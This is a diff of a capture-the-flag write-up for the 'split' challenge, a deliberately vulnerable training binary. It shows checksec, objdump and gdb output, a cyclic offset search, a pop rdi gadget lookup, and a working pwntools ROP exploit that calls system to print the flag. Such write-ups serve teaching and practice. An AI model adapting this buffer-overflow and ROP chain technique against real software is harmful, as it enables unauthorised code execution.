@@ -1,6 +1,6 @@
 First of all, use checksec to get some binary information
 
-```
+```shell
 [marco@marco-pc Downloads]$ file split
 split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8cbc19d1114b70bce2305f7ded9e7dd4d2e28069, not stripped
 [marco@marco-pc Downloads]$ checksec --file=split
@@ -9,9 +9,7 @@ Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RU
 ```
 
 The file is not stripped, so let's use objdump and gdb (with pwndbg) to get some information from symbol table
-
-
-```
+```shell
 [marco@marco-pc Downloads]$ objdump -t split
 ...
 00000000004007b5 l     F .text	0000000000000052              pwnme
@@ -25,8 +23,7 @@ There are some interesting stuff:
 - pwnme, which is called from main, print some strings and get an input;
 - usefulFunction perfom a system comand "/bin/ls"
 - usefulString is "/bin/cat flag.txt"
-
-```
+```gdb
 pwndbg> disassemble usefulFunction 
 Dump of assembler code for function usefulFunction:
    0x0000000000400807 <+0>:	push   rbp
@@ -45,8 +42,7 @@ pwndbg> x/s 0x0000000000601060
 
 With a buffer overflow we can control the EIP. Jumping at system@plt with usefulString as parameter, we can read the flag.
 Let's find out how many bytes we need to fill until EIP
-
-```
+```gdb
 pwndbg> cyclic 50
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
 
@@ -72,31 +68,28 @@ pwndbg> cyclic -l 'iaaa'
 
 Last thing we need is a *`pop rdi; ret`* gadget to pass the string as argument
 
-```
+```shell
 [marco@marco-pc Downloads]$ ROPgadget --binary /home/marco/Downloads/split > /home/marco/Downloads/gadget
 [marco@marco-pc Downloads]$ cat /home/marco/Downloads/gadget | grep "pop rdi"
 0x0000000000400883 : pop rdi ; ret
 ```
 
 Final exploit:
-
 NOTE: Remember to add 8 at 32 ( 32 buffer + 8 RBP ).
-
 ```python
-  1 from pwn import *
-  2 
-  3 system_addr = 0x4005e0
-  4 string_addr = 0x0000000000601060
-  5 pop_rdi = 0x0000000000400883
-  6 
-  7 expl = ("A"*40).encode()
-  8 expl += p64(pop_rdi)
-  9 expl += p64(string_addr)
- 10 expl += p64(system_addr)
- 11 
- 12 p = process('./split')
- 13 p.recvuntil('>')
- 14 p.sendline(expl)
- 15 p.interactive()
+from pwn import *
+ 
+system_addr = 0x4005e0
+string_addr = 0x0000000000601060
+pop_rdi = 0x0000000000400883
 
+expl = ("A"*40).encode()
+expl += p64(pop_rdi)
+expl += p64(string_addr)
+expl += p64(system_addr)
+
+p = process('./split')
+p.recvuntil('>')
+p.sendline(expl)
+p.interactive()
 ```
